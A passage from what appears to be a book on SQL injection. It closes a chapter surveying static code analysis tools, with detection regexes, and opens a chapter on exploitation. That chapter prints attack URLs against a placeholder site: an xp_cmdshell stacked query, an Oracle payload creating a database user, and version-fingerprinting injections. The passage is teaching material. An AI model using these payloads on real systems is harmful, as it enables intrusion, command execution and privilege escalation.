analyzers . lexical analysis is necessary to reliably distinguish variables from functions and to identify function arguments. some source code analyzers, such as those that operate as plug -ins to an ide, often make use of an abstract syntax tree (ast). an ast is a tree representation of the simplified syntactic structure of the source code. you can use an ast to perform a deeper analysis of the source elements to help track data flows and identify sinks and sink sources . another method that some source code analyzers implement is data flow analysis, a process for collecting information about the use, definition, and dependencies of data in programs. the data flow analysis algorithm operates on a control flow graph (cfg) generated from the ast. you can use a cfg to determine the parts of a program to which a particular value assigned to a variable might propagate. a cfg is a representation, using graph notation, of all paths that might be traversed through a program during its execution. at the time of this writing, automated tools incorporate three distinct methods of analysis: string -based pattern matching, lexical token matching, and data flow analysis via an ast and/or a cfg. automated static code analysis tools can be very useful in helping security consultants identify dangerous coding behaviors that incorporate security -sensitive functions or sinks, and make the task of identifying sink sources by tracing tainted data back to its origin (entry point) much simpler. how ever, you should not rely blindly on their results. although in some ways they are an improvement over manual techniques, they should be used by security conscientious developers or skilled and knowledgeable security consultants who can contextualize their findings and make an informed decision on their validity. i also recommend that you use any automated tool in conjunction with at least one other tool as well as a manual investigation of the code utilizing the techniques presented in this chapter. this c ombined approach will give you the highest level of confidence in your findings and allow you to eradicate the majority of false positives as well as to help you identify false negatives. these tools don’t eliminate the need for a human reviewer; a certain level of security acumen is required to use the tools correctly. web application programming languages are rich, expressive languages that you can use to build anything, and analyzing arbitrary code is a difficult job that requires a lot of context. these tools are more like spell checkers or grammar checkers; they don’t understand the context of the code or the application and can miss many important security issues. graudit graudit is a simple shell script and collection of signature sets that allows you to find potential security flaws in the source code using the gnu utility grep. it’s comparable to other static analysis applications while keeping the technical requirements to a minimum and being very flexible. writing your own graudit signatures is rel atively easy. mastering regular expressions can be helpful, but in their simplest form a list of words will do. for example the rules below can be used for postgresql: pg_query\\ s∗\\(.∗\\$.∗\\) pg_exec\\ s∗\\(.∗\\$.∗\\) pg_send_query\\ s∗\\(.∗\\$.∗\\) pg_send_query_para ms\\s∗\\(.∗\\$.∗\\) pg_query_params\\ s∗\\(.∗\\$.∗\\) pg_send_prepare\\ s∗\\(.∗\\$.∗\\) pg_prepare \\s∗\\(.∗\\$.∗\\) pg_execute \\s∗\\(.∗\\$.∗\\) pg_insert\\ s∗\\(.∗\\$.∗\\) pg_put_line\\ s∗\\(.∗\\$.∗\\) pg_select\\ s∗\\(.∗\\$.∗\\) pg_update\\ s∗\\(.∗\\$.∗\\) • url: www.justanotherhacker.com/projects/graudit.html • language: asp, jsp, perl, php and python (write your own configuration file and regular expressions for any language) • platforms: windows, linux, and os x (requires bash, grep, and sed) • price: free yet another source code analyzer (yasca) yasca is an open source program that looks for security vulnerabilities and code -quality issues in program source codes. it analyzes php, java, c/c++, and javascript (by default) for security and code- quality issues. yasca is extensible via a plug -in-based architecture. it integrates other open source programs such as findbugs ( http://findbugs.sourceforge .net), pmd ( http://pmd.sourceforge.net ), and jlint ( http://artho.com/jlint). you can use the tool to scan other languages by writing rules or integrating external tools. it is a command -line tool, with reports being generated in html, csv, xml, and other formats. the tool flags the use of potentially dangerous functions when they are used in conjunction with input that is taken directly from an http request (low -hanging fruit) for jsp files. the tool isn’t perfect; however, the developer is committed to improving it. you can easily extend the tool by writing your own custom rule files: • url: www.yasca.org • language: write your own configur ation file and regular expressions for any language • platforms: windows and linux • price: free pixy pixy is a free java program that performs automatic scans of the php 4 source code, aimed at the detection of cross -site scripting (xss) and sql injection vulnerabilities. pixy analyzes the source code for tainted variables. the tool then traces the flow of the data through the application until it reaches a dangerous function. it is also capable of identifying when a variable is no longer tainted (i.e. it has been passed through a sanitization routine). pixy also draws dependency graphs for tainted variables. the graphs are very useful for understanding a vulnerability report. with dependency graphs, you can trace the causes of warnings back to the source v ery easily. however, pixy fails to identify sql injection vulnerabilities within the mysql_db_query() , ociexecute() , and odbc_exec() functions. nonetheless, it is easy to write your own configuration file. for example, you can use the following sink file t o search for the mysql_db_query() function: # mysql_db_query sql injection configuration file for user -defined sink sinktype = sql mysql_db_query = 0 unfortunately pixy currently supports only php 4: • url: http://pixybox.seclab.tuwien.ac.at/pixy • language: php (version 4 only) • platforms: windows and linux • price: free appcodescan appcodescan is a tool you can use to scan source codes for a number of vulnerabilities, one of which is sql injection. it uses regular expression strings matching to identify potentially dangerous functions and strings in the code base and comes up with a number of configuration files. the tool does not positively identify the existence of a vulnerability. it merely identifies the usage of functions that could lead to the presence of a vulnerability. you can also use appcodescan to identify entry points int o the application. also very useful is the ability to trace parameters through the code base. this tool runs on the .net framework and at the time of this writing was still in initial beta state. it will be a favorite for those who prefer working in a gui as apposed to the command line. configuration files are simple to write and modify. here is the default regular expression for detecting potential sql injection vulnerabilities in .net code: #scanning for sql injections .∗.sqlcommand. ∗?|.∗.dbcommand.∗ ?|.∗.oledbcommand.∗ ?|.∗.sqlutility.∗ ?| .∗.odbccommand.∗ ?|.∗.oledbdataadapter.∗ ?|.∗.sqldatasource.∗ ? it is as trivial a task to add the oraclecommand() function as it is to write a custom regular expression for php or java. you can use the following rule for php: # php sql injection rules file for appcodescan # scanning for sql injections .∗.mssql_query.∗ ?|.∗.mysql_query.∗ ?|.∗.mysql_db_query.∗ ?|.∗.oci_parse.∗ ?|.∗.ora_parse.∗ ?|.∗.ms sql_bind.∗ ?|.∗.mssql_execute.∗ ?|.∗.odbc_prepare. ∗?|.∗.odbc_execute.∗ ?|.∗.odbc_execute.∗ ?|.∗ .odbc_exec.∗ ? • url: www.blueinfy.com • language: write your own configuration file and regular expressions for any language • platform: windows • price: free owasp lapse+ project lapse+ is a security scanner for detecting vulnerabilities, specifically the injection of untrusted data in java ee applications. it has been developed as a plug -in for the eclipse java development environment ( www.eclipse.org ), working specifically with eclipse helios and java 1.6 or higher. lapse+ is based on the gpl software lapse, developed by benjamin livshits as part of the griffin software security project. this new release of the plugin developed by eva lues lab of universidad carlos iii de madrid provides more features to analyze the propagation of the malicious data through the application and includes the identification of new vulnerabilities. lapse+ targets the following web application vulnerabilitie s: parameter tampering, url tampering, header manipulation, cookie poisoning, sql injection, cross -site scripting (xss), http response splitting, command injection, path traversal, xpath injection, xml injection, and ldap injection. lapse+ performs taint s tyle analysis in order to determine if it is possible to reach a vulnerability source from a vulnerability sink by performing backward propagation through the different assignations. lapse+ is highly customizable; the configuration files shipped with the plug- in (sources.xml and sinks.xml) can be edited to augment the set of source and sink methods, respectively: • url: www.owasp.org/index.php/owasp_lapse_project • language: java j2ee • plat forms: windows, linux, and os x • ide: eclipse • price: free microsoft source code analyzer for sql injection the microsoft source code analyzer for sql injection tool is a static code analysis tool that you can use to find sql injection vulnerabilities in active server pages (asp) code. the tool is for asp classic and not .net code. in addition, the tool understands only classic asp codes that are written in vbscript. it does not analyze server -side codes that are written in any other languages, such as js cript: • url: http://support.microsoft.com/kb/954476 • language: asp classic (vbscript) • platform: windows • price: free microsoft code analysis tool .net (cat.net) cat.net is a binary code analysis tool that helps you to identify common variants of certain prevailing vulnerabilities that can give rise to common attack vectors such as xss, sql injection, and xpath injection. cat.net is a snap- in to visual studio 2005 or 2008 that helps to identify security flaws within a managed code (c#, visual basic .net, j#) application. it does so by scanning the binary and/or assembly of the application, and tracing the data flow among its statements, methods, and assemblies. this includes indirect data types such as property assignments and instance tainting operations. note that cat.net has not been made available separately for visual studio 2010 or later as it has been integrated into the code analysis functionality within the product (only available in premium and ultimate editions): • url: www.microsoft.com/download/en/details.aspx?id=19968 • languages: c#, visual basic .net, and j# • platform: windows • ide: visual studio • price: free rips —a static source code analyzer for vulnerabilities in php scripts rips is a tool written in php that can be used to leverage static code analysis techniques to find vulnerabilities in php applications. by tokenizing a nd parsing all source code files, rips is able to transform the php source code into a program model. it is then possible to detect sensitive sinks (potentially vulnerable functions) that can be tainted by user input (influenced by a malicious user) during the program flow. rips also offers an integrated code audit framework for further manual analysis: • url: http://rips -scanner.sourceforge.net/ • language: php • platform: os x, windows, and linux • price: free codepro analytix codepro analytix seamlessly integrates into the eclipse environment, using automated source code analysis to pinpoint quality issues and security vulnerabilities. there are a large number of preconfigured audit rules available. the “tainted user input” rule can be used to look for potential execution paths from a source to a sink. it is important to note that the paths it finds are potential in the sense that codepro is performing a static analysis and therefore cannot know whet her a specific execution path is ever followed in practice. there are also a number of sql specific audit rules available that can help identify sql injection issues. it is not trivial to create your own audit rules, but it is also not too complex a task ( see http://code.google.com/javadevtools/codepro/doc/features/audit/audit_adding_new_rules.html ) : • url: http://code.google.com/javadevtools/codepro/doc/index.html • language: java, jsp, jsf, struts, hibernate and xml • platform: os x, windows, and linux • price: free teachable static analysis workbench teachable static analysis workbench (tesa) allows security analysts to evaluate java web applications in order to find security vulnerabilities connected with improper input validation. the main difference of tesa from the previous static analyzers is that tesa requires the analyst to “teach” (configure) the tool to find all vulnerabilities that can be expressed as data flows from a taint source through to a sensitive sink. for example to “teach” the tool how to identify sql injection issues the analyst has to mark the httpservletre quest.getparameter() method as a source of tainted data and mark the statement.executequery() function as a sensitive sink. another tesa feature distinguishing it from other static analyzers is the ability to mark methods that reliably untaint data by perf orming suitable validation. tainted data that then pass through the marked functions becomes untainted and are not reported. the static analyzer is implemented as a plugin to the findbugs ( http://findbugs.sourceforge.net ) tool. the current release of tesa supports servlets and java server pages in web applications only, and doesn’t have built -in support of any web application framework: • url: http://code.g oogle.com/p/teachablesa/ • language: java servlet pages • ide: eclipse ide for java ee developers 3.4 (ganymede) • platform: windows and linux • price: free commercial source code review tools commercial source code analyzers (scas) are designed to integrate within the development life cycle of an application. their goal is to ultimately assist the application developer in eradicating vulnerabilities in application source codes as well as in hel ping him to produce more inherent secure codes. they do this by providing education and knowledge with regard to the coding mistakes that lead to the presence of security vulnerabilities, as well as by empowering the developer with the tools and skills to easily adhere to secure coding practices. each tool is marketed in its own unique way and the marketing material available for each one is extensive. the purpose of this section is not to recommend a particular product over another; it is very difficult to find good impartial comparison reviews for these products. furthermore, it is not an easy task to find technical details on the exact approach or methodology used by each product —that is, without getting lost in public relations and sales material! the li st presented is by no means extensive, but serves to introduce more advanced tool suites for readers who may require such things. i have worked with a number of clients to successfully integrate solutions that incorporated both commercial off -the-shelf (co ts) and free and open source software (foss) source code analyzers and tool suites. the approach and products chosen in each situation are modified to individual requirements. good quality assurance techniques can be effective in identifying and eliminatin g vulnerabilities during the development stage. penetration testing, fuzz testing, and source code audits should all be incorporated as part of an effective quality assurance program. improving the software development process and building better software are ways to improve software security (i.e. by producing software with fewer defects and vulnerabilities). many cots software packages are available to support software security assurance activities. however, before you use these tools, you must carefully evaluate them and ensure that they are effective. i suggest that before parting with what can be very large sums of money, you perform your own comprehensive product evaluation. to research the tools, you can use the free trials that are available from the companies’ web sites or contact a sales representative. notes from the underground... the right tool for the job implementing scas into the development life cycle does not automatically result in the production of secure application code. tools that impleme nt metrics based on historical data in an attempt to provide management with pretty graphs and trend analysis reports that inadvertently lead to reprimands for developers or project leads for failing to meet arbitrary targets can be counterproductive. just like hackers, developers can be very capable of finding ingenious ways to “beat the system” so that metrics are favorable (i.e. producing codes in such a manner that the sca does not flag their code). this can lead to vulnerabilities being resident within the code and not being identified. in addition, if the developer does not understand why a vulnerability is being reported and the tool does not provide sufficient information to instill a comprehensive understanding, he can be lulled into believing that the alert is nothing more than a false positive. there are a couple of very public and well -known examples of such situations occurring in the code of the realnetworks realplayer software (cve -2005- 0455, can -2005- 1766, and cve -2007- 3410). the published vul nerability announcements contained the vulnerable lines of source codes. the ignore directive for a popular sca (flawfinder) was appended to the vulnerable lines. the tool had reported the vulnerability, but instead of fixing it, a developer had added the ignore directive to the code so that the tool would stop reporting the vulnerability! remember the old proverb: “a bad workman always blames his tools”! in these situations, it may be easy to blame the tool for failing to deliver. however, this is not the case. you should never rely on just one tool, and instead should leverage multiple tools and techniques during the development of the life cycle. in addition, multiple experienced and knowledgeable individuals should perform audits at different stages of t he project to provide assurances that implemented processes and procedures are being followed. developers shouldn’t be reprimanded harshly; instead, they should be given constructive feedback and education where necessary so that they learn from the proces s and ultimately produce more secure codes. code analysis tools should be used as guidelines or preliminary benchmarks as opposed to definitive software security solutions. fortify source code analyzer source code analyzer is a static analysis tool that pr ocesses codes and attempts to identify vulnerabilities. it uses a build tool that runs on a source code file or set of files and converts the file(s) into an intermediate model that is then optimized for security analysis: • url: www.fortify.com/products/hpfssc/source -code -analyzer.html • languages: over 18 development languages • platforms: windows, mac, solaris, linux, aix, and hp -ux • ides: support for several environments, such as microsoft visual studio, eclipse, websphere application developer, and ibm rational application developer • price: contact to request quote rational appscan source edition appscan source edition is a static analysis tool that identifies vulnerabilities through reviewing data and call flows. similar to fortify, it is designed to integrate into enterprise development processes, as well as being able to be run locally by an individual: • url: www.ibm.com/software/rational/products/appscan/source/ • languages: over 15 development languages • platforms: windows, solaris, and linux • ides: microsoft visua l studio, eclipse, and ibm rational application developer • price: contact to request quote codesecure codesecure is available as an enterprise- level appliance or as a hosted software service. codesecure workbench is available as a plug -in to the visual studio, eclipse, and ibm rational application developer ides. codesecure is based on pattern- free algorithms; it determines the behavioral outcomes of input data by calculating all possible execution paths. during analysis, each vulnerability is traced back to the original entry point and line of code that caused it, providing a map of the vulnerability propagation through the application: • url: www.armorize.com • languages: java, php, asp, and .net • platform: web -based • ides: visual studio, eclipse, and ibm rational application developer • price: contact to request quote klocwork solo klocwork solo is a stand- alone source code analysis tool for individual java developers focused on mobile and web application developm ent. it is advertised that the eclipse plugin can automatically find critical issues such as resource leaks, null pointer exceptions, sql injections, and tainted data: • url: www.klocwork.com/products/ solo/ • language: java • platform: windows 32 bit • ides: eclipse • price: contact to request quote summary in this chapter, you learned how to review source codes using manual static code analysis techniques to identify taint -style vulnerabilities. you wi ll need to practice the techniques and methods you learned before you become proficient in the art of code auditing; however, these skills will help you better understand how sql injection vulnerabilities are still a common occurrence many years after they were brought to the attention of the public. the tools, utilities, and products we discussed should help you put together an effective toolbox for scrutinizing source codes, not only for sql injection vulnerabilities but also for other common coding error s that can lead to exploitable vectors. to help you practice your skills, try testing them against publicly available vulnerable applications that have exploitable published security vulnerabilities. i recommend downloading the the open web application sec urity project (owasp) broken web applications project. it is distributed as a virtual machine in vmware format. it can be downloaded from http://code.google.com/p/owaspbwa/wiki/projectsu mmary . it includes applications from various sources and consists of training applications, realistic and intentionally vulnerable applications as well as many old versions of real applications. a quick google search for “vulnerable web applications” will also give you plenty of target applications. try as many of the automated tools listed in this chapter as you can until you find a tool that works for you. don’t be afraid to get in touch with the developers and provide them constructive feedback with rega rd to how you think the tools could be improved, or to highlight a condition that reduces its effectiveness. i have found them to be receptive and committed to improving their tools. happy hunting! solutions fast track reviewing source code for sql injection • there are two main methods of analyzing source codes for vulnerabilities: static code analysis and dynamic code analysis. static code analysis, in the context of web application security, is the process of analyzin g source codes without actually executing the code. dynamic code analysis is the analysis of code performed at runtime. • tainted data are data that have been received from an untrusted source (sink source), whether it is a web form, cookie, or input param eter. tainted data can potentially cause security problems at vulnerable points in a program (sinks). a sink is a security -sensitive function (e.g. a function that executes sql statements). • to perform an effective source code review and identify all pote ntial sql injection vulnerabilities, you need to be able to recognize dangerous coding behaviors, identify security -sensitive functions, locate all potential methods for handling user -controlled input, and trace tainted data back to their origin via their execution path or data flow. • armed with a comprehensive list of search strings, the simplest and most straightforward approach to conducting a manual source code review is to use the unix utility grep (also available for windows systems). automated sourc e code review • at the time of this writing, automated tools incorporate three distinct methods of analysis: string -based pattern matching, lexical token matching, and data flow analysis via an abstract syntax tree (ast) and/or a control flow graph (cfg). • some automated tools use regular expression string matching to identify sinks that pass tainted data as a parameter, as well as sink sources (points in the application where untrusted data originates). • lexical analysis is the process of taking an input string of characters and producing a sequence of symbols called lexical tokens. some tools preprocess and tokenize source files and then match the lexical tokens against a library of sinks. • an ast is a tree representation of the simplified syntactic str ucture of source code. you can use an ast to perform a deeper analysis of the source elements to help track data flows and identify sinks and sink sources. • data flow analysis is a process for collecting information about the use, definition, and dependen cies of data in programs. the data flow analysis algorithm operates on a cfg generated from an ast. • you can use a cfg to determine the parts of a program to which a particular value assigned to a variable might propagate. a cfg is a representation, using graph notation, of all paths that might be traversed through a program during their execution. frequently asked questions q: if i implement a source code analysis suite into my development life cycle will my software be secure? a: no, not by itself. good quality assurance techniques can be effective in identifying and eliminating vulnerabilities during the development stage; penetration testing, fuzz testing, and source code audits should all be incorporated as part of an effective quality assurance progra m. a combined approach will help you produce software with fewer defects and vulnerabilities. a tool can’t replace an intelligent human; a manual source code audit should still be performed as part of a final qa. q: tool x gave me a clean bill of health. does that mean there are no vulnerabilities in my code? a: no, you can’t rely on any one tool. ensure that the tool is configured correctly and compare its results with the results you obtained from at least one other tool. a clean bill of health from a correctly configured and effective tool would be very unusual in the first review. q: management is very pleased with the metrics reports and trend analysis statistics that tool x presents. how trustworthy are this data ? a: if the tool reports on real findings that have been independently verified as being actual vulnerabilities, as opposed to reporting on how many alerts were raised, it can probably be very useful in tracking your return on investment. q: grep and awk are gnu hippy utilities for the unwashed beardy linux users; surely there is an alternative for us windows guys and girls? a: grep and awk are available on windows systems too. if that still feels to dirty to you, you can use the findstr utility natively av ailable on win32 systems. you probably could also use your ide to search source files for string patterns. it may even be possible to extend its functionality through the use of a plug -in. google is your friend. q: i think i have identified a vulnerability in the source code for application x. a sink uses tainted data from a sink source; i have traced the data flow and execution path and i am confident that there is a real sql injection vulnerability. how can i be absolutely certain, and what should i do ne xt? a: you have a path to choose that only you can follow. you can choose the dark side and exploit the vulnerability for profit. or you can chase fame and fortune by reporting the vulnerability to the vendor and working with them to fix the vulnerability, resulting in a responsible disclosure crediting your skills! or, if you are a software developer or auditor working for the vendor, you can try to exploit the vulnerability using the techniques and tools presented in this book (within a test environment a nd with explicit permission from system and application owners!) and show management your talents in the hope of finally receiving that promotion. q: i don’t have the money to invest in a commercial source code analyzer; can any of the free tools really be that useful as an alternative? a: try them and see. they aren’t perfect, they haven’t had many resources available to them as the commercial alternatives, and they definitely do not have as many bells and whistles, but they are certainly worth trying. whi le you are at it, why not help the developers improve their products by providing constructive feedback and working with them to enhance their capabilities? learn how to extend the tools to fit your circumstances and environment. if you can, consider donat ing financial aid or resources to the projects for mutual benefit. chapter 4 exploiting sql injection alberto revelli solutions in this chapter: • understanding common exploit techniques • identifying the database • extracting data through union statements • using conditional statements • enumerating the database schema • injecting into “insert” queries • escalating privileges • stealing the password hashes • out -of-band communication • sql injection on mobile devices • automating sql injection exploitation introduction once you have found and confirmed that you have an sql injection point, what do you do with it? you may know you can interact with the database, but you don’t know what the back-end database is, or anything about the query you are injecting i nto, or the table(s) it is accessing. again, using inference techniques and the useful error the application gives you, you can determine all of this, and more. in this chapter, we will discuss how deep the rabbit hole goes (you did take the red pill, didn’t you?). we’ll explore a number of the building blocks you’ll need for later chapters, as well as exploit techniques for reading or returning data to the browser, for enumerating the database schema from the database, and for returning information out of band (i.e. not through the browser). some of the attacks will be targeted to extract the data that the remote database stores and others will be focused on the database management system (dbms) itself, such as trying to steal the database users’ password h ashes. because some of these attacks need administrative privileges to be carried out successfully, and because the queries that many web applications run are performed with the privileges of a normal user, we will also illustrate some strategies for obtai ning administrative privileges. and finally, so that you don’t have to do it all manually, we’ll also look at techniques and tools (many written by the authors of this book) for automating a lot of these steps for efficiency . tools & traps... the big danger: modifying live data although the examples in the following sections will deal primarily with injections into select statements, never forget that your vulnerable parameter could be used in far more dangerous queries that use commands such as insert, update , or delete instead. although a select command only retrieves data from the database and strictly follows a “look but don’t touch” approach, other commands can (and will) change the actual data in the database that you are testing, which migh t cause major problems in the case of a live application. as a general approach, when performing an sql injection attack on an application where more than one parameter is vulnerable, always try to give priority to parameters that are used in queries that do not modify any data. this will allow you to operate far more effectively, freely using your favorite techniques without the risk of tainting the data or even disrupting application functionality. on the other hand, if the only vulnerable parameters at your disposal are used to modify some data, most of the techniques outlined in this chapter will be useful for exploiting the vulnerability. however, be extra careful in what you inject and how this might affect the database. if the application you are test ing is in production, before performing the actual attack make sure all the data is backed up and that it is possible to perform a full rollback after the security testing of the application has been completed. this is especially true when using an automated tool such as the ones i will introduce at the end of the chapter. such tools can easily execute hundreds or thousands of queries in a very short time to do their job, all with minimal user interaction. using such a tool to inject on an update or a delet e statement can wreak havoc on a database server, so be careful! later in this chapter, we will include some hints about how to deal with these kinds of queries. understanding common exploit techniques arriving at this point, you have probably found one or more vulnerable parameters on the web application you are testing, by either using the techniques for testing the application outlined in chapter 2 , or reviewing the code outlined in chapter 3 . perhaps a single quote inserted in the first get parameter that you tried was sufficient to make the application return a database error, or maybe you literally spent days stubbornly going through each parameter trying entire arrays of different and exotic attack vectors. whatever the case, now is the ti me to have some real fun with the actual exploitation. it is very useful at this stage to have a local installation of the same database system that sits behind the application you are attacking. unless you have the web application source code, sql injection requires a black- box attack approach, and you will have to craft the queries to inject by observing how your target responds to your requests. being able to locally test the queries you are going to inject in order to see how the database responds to such queries (both in terms of returned data and error messages) makes this phase a lot easier. exploiting a sql injection vulnerability can mean different things in different situations depending on the conditions in place, such as the privileges of the use r performing the queries, the exact database server that sits at the back -end, and whether you are more interested in extracting data, modifying data, or running commands on the remote host. however, at this stage what really makes a difference is whether the application presents in the html code the output of your sql queries (even if the database server returns only the error message). if you don’t have any kind of sql output displayed within the application, you will need to perform a blind sql injection attack, which is more intricate (but a lot more fun). we’ll extensively cover blind sql injection in chapter 5 . for now, and unless specified otherwise, we will assume that the remote database returns sql output to some extent, and we will go through a plethora of attack techniques that leverage this fact. for most of our examples, we’ll introduce the companion that will be with us throughout most of the examples in this chapter: a vulnerable e -commerce application bel onging to our usual victim.com friends. this application has a page that allows a user to browse the different products. the url is as follows: • http://www.victim.com/products.asp?id=12 when this url is requested, the application returns a page with the details of the product with an id value of 12 (say, a nice syngress book on sql injection), as shown in figure 4.1. figure 4.1 the product description page of a sample e -commerce site let’s say the id parameter is vulnerable to s ql injection. it’s a numeric parameter, and therefore in our examples we will not need to use single quotes to terminate any strings. but the same concepts that we will explore along the way are obviously valid for other types of data. we will also assume that victim.com uses microsoft sql server as its back -end database (even though the chapter will also contain several examples for other database servers). to improve clarity, all our examples will be based on get requests, which will allow us to put all the injected payloads in the url. however, you can apply the same techniques for post requests by including the injected code into the request body instead of the url. tip remember that when using all of the following e xploitation techniques, you might need to comment out the rest of the original query to obtain syntactically correct sql code (e.g. by adding two hyphens, or a # character in the case of mysql). see chapter 2 for more information on how to terminate sql queries using comments. using stacked queries one of the elements that have a considerable impact on the ability to exploit a sql injection vulnerability is whether stacked queries (a sequence of multiple querie s executed in a single connection to the database) are allowed. here is an example of an injected stacked query, in which we call the xp_cmdshell extended procedure to execute a command: http://www.victim.com/products.asp=id=1;exec+master..xp_cmdshell+‘dir’ being able to close the original query and append a completely new one, and leveraging the fact that the remote database server will execute both of them in sequence, provides far more freedom and possibilities to the attacker compared to a situation where you can only inject codes in the original query. unfortunately, stacked queries are not available on all database server platforms. whether this is the case depends on the remote database server as well as on the technology framework in use. for instance, microsoft sql server allows stacked queries when it is accessed by asp, .net, and php, but not when it is accessed by java. php also allows stacked queries when used to access postgresql, but not when used to access mysql. ferruh mavituna, a security rese archer and tool author, published a table that collects this information on his sql injection cheat sheet; see http://ferruh.mavituna.com/sql -injection cheatsheet -oku/. exploiting ora cle from web applications oracle poses a challenge when exploiting sql injection over the web. one of the biggest handicaps is the limitation of the oracle sql syntax, which does not allow execution of stacked queries. in order to execute multiple statemen ts in oracle’s sql language we need to find a way to execute a pl/sql block. pl/sql is a programming language built directly into oracle that extends sql and does allow stacked commands. one option is to use an anonymous pl/sql block, which is a free -floating chunk of pl/sql code wrapped between a begin and an end statement. the following demonstrates an anonymous “hello world” pl/sql code block: sql> declare mesg varchar2(200); begin mesg:=‘hello world’; dbms_output.put_line(mesg); end; / by default oracle comes with a number of default packages, two of which have been shipped with oracle versions 8i to 11g r2 that allow execution of anonymous pl/sql blocks. these functions are: • dbms_xmlquery.newcontext() • dbms_xmlquery.getxml() further, these functions are accessible to public by default. thus any database user, irrespective of access privileges has permission to execute these functions. these functions can be used to issue dml/ddl statements when exploiting sql injection as demonstrated below (creating a new database user, assuming the database user has create user privileges): http://www.victim.com/index.jsp?id=1 and (select dbms_xmlquery.newcontext(‘declare pragma autonomous_transaction; begin execute immediate ‘‘ create user pwned identified by pwn3d ’’; commit; end;’) from dual) is not null -- the ability to execute pl/sql in this way gives us the same level of control as an attacker would have during interactive access (e.g. via a sqlplus prompt), therefore allowing us to call functionality not norma lly accessible via oracle sql. identifying the database to successfully launch any sql injection attack, it is of paramount importance to know the exact database server that the application is using. without that piece of information, it is impossible to f ine-tune the queries to inject and extract the data you are interested in. the web application technology will give you your first hint. for instance, asp and .net often use microsoft sql server as the back -end database. on the other hand, a php applicatio n is likely to be using mysql or postgresql. if the application is written in java, it probably talks with an oracle or a mysql database. also, the underlying operating system might give you some hints: a server farm of internet information server (iis) in stallations is a sign of a microsoft -based infrastructure, so sql server is probably behind it. meanwhile, a linux server running apache and php is more likely to be using an open source database such as mysql or postgresql. obviously, you should not rely only on these considerations for your fingerprinting effort, because it is not unusual for administrators to combine different technologies in ways that are less common. however, the infrastructure that is in front of the database server, if correctly iden tified and fingerprinted, can provide several hints that will speed up the actual fingerprinting process. the best way to uniquely identify the database depends heavily on whether you are in a blind or non- blind situation. if the application returns, at le ast to a certain level, the results of your queries and/or the error messages of the database server (i.e. a non -blind situation), the fingerprint is fairly straightforward, because it is very easy to generate output that provides information about the underlying technology. on the other hand, if you are in a blind situation and you can’t get the application to return database server messages, you need to change your approach and try to inject queries that are known to work on only a specific technology. depending on which of those queries are successfully executed, you will be able to obtain an accurate picture of the database server you are dealing with. non-blind fingerprint very often, all it takes to get an idea of the back -end database server is to see one error message that is verbose enough. the message generated by the same kind of sql error will be different depending on the database server technology that was used to e xecute the query. for instance, adding a single quote will force the database server to consider the characters that follow it as a string instead of as sql code, and this will generate a syntax error. on microsoft sql server, the resultant error message w ill probably look similar to the screenshot shown in figure 4.2. figure 4.2 sql error me ssage resulting from an unclosed quotation mark it’s hard to imagine anything easier: the error message clearly mentions “sql server,” plus some helpful details regarding what went wrong, which will be useful later when you’re crafting a correct query. a s yntax error generated by mysql 5.0, on the other hand, will more likely be the following: error 1064 (42000): you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near ’’ at line 1 also in this case, the error message contains a clear hint of the database server technology. other errors might not be as useful, but this is not usually a problem. note the two error codes at the beginning of the last error message. those by themselves form a signature for mysql. for instance, if you try to extract data from a non- existent table on the same mysql installation, you will receive the following error: error 1146(42s02): table ‘foo.bar’ doesn’t exist as you can see, databases generally prepen d an error message with some kind of code that uniquely identifies the error type. as a further example, you might guess the database server that generated the following error: ora-01773:may not specify column datatypes in this create table the “ora” strin g at the beginning is the giveaway: it is an oracle installation! a complete repository of all oracle error messages is available at www.ora -code.com . sometimes, the revealing bit does not come from the database serv er itself, but from the technology used to talk to it. for instance, look at the following error: pg_query(): query failed: error: unterminated quoted string at or near “‘’’ at character 69 in /var/www/php/somepge.php on line 20 the database server technol ogy is not mentioned, and there is not an error code that is peculiar to a specific product. however, the function pg_query (and the deprecated version pg_exec) is used by php to run queries on postgresql databases, and therefore immediately reveals this d atabase server being used in the back -end. remember: google is your friend, and any error code, function name, or apparently obscure string can help you fingerprinting the back- end in a matter of seconds. banner grabbing error messages can allow you to obt ain a fairly precise idea of the technology the web application uses to store its data. however, this is not enough, and you can go beyond that. in the first example, for instance, we discovered that the remote database is sql server, but there are various versions of this product; at the time of this writing, the most widespread versions are sql server 2005 and 2008, but there are still sql server 2000 installations in use. being able to discover a few more details, such as the exact version and patch level, would allow you to quickly understand whether the remote database has some well -known flaw that you can exploit. luckily, if the web application returns the results of the injected queries, figuring out the exact technology is usually straightforward. a ll major database technologies allow at least one specific query that returns the software version, and all you need is to make the web application return the result of that query. table 4.1 provides some examples of queries that will return, for a given technology, a string containing the exact database server version. table 4.1 returning the database server version database server query microsoft sql server select @@version mysql select version() select @@version oracle select banner from v$version select banner from v$version where rownum=1 postgresql select version() for instance, running the query on sql server 2008 rtm, by issuing the query select @@version you will obtain the following: microsoft sql server 2008 (rtm) - 10.0.1600.22 (intel x86) jul 9 2008 14:43:34 copyright (c) 1988 –2008 microsoft corporation standard edition on windows nt 5.2 <x86> (build 3790: service pack 2) that is quite a lot of informa tion, because it includes not only the exact version and patch level of sql server, but also information about the operating system on which it is installed, since “nt 5.2” refers to windows server 2003, to which service pack 2 has been applied. because mi crosoft sql server produces very verbose messages, it is not too hard to generate one that contains the value @@version . for instance, in the case of a numeric injectable parameter, you can trigger a type conversion error by simply injecting the name of the variable where the application expects a numeric value. as an example, consider the following url: http://www.victim.com/products.asp?id=@@version the application is expecting a number for the id field, but we pass it the value of @@version, which is a s tring. sql server, when executing the query, will dutifully take the value of @@version and will try to convert it to an integer, generating an error similar to the one in figure 4.3, which tells us that we are dealin g with sql server 2005 and includes the exact build level and information regarding the underlying operating system. tip version information on postgresql microsoft sql server is not the only database to return information about the underlying operating sy stem and architecture: postgresql also returns a wealth of information, as you can see in the following example, which is a result of running the query select version(): postgresql 9.1.1 on i686- pc-linux-gnu, compiled by i686 -pc-linux-gnu-gcc (gentoo harde ned 4.4.5 p1.2, pie 0.4.5, 32 -bit) in this case, not only we know the version of the database server but also the underlying linux flavor (hardened gentoo), the architecture (32 bits), and even the version of the compiler used to compile the database serve r itself (gcc 4.4.5): all this information might become extremely useful in case, after our sql injection, we find some memory corruption bug that we need to exploit to expand our influence at the operating system level. figure 4.3 extracting the server version using an error message of course, if the only injectable parameter is not a number you can still retrieve the information you need. for instance, if the injectable parameter is echoed back in a response, you can easily inject @@version as part of that string. more specifically, let’s assume that we have a search page that returns all the entries that contain the specified string: http://www.victim.com/searchpeople.asp?name=smith such a url will probably be used in a query that will look something like the 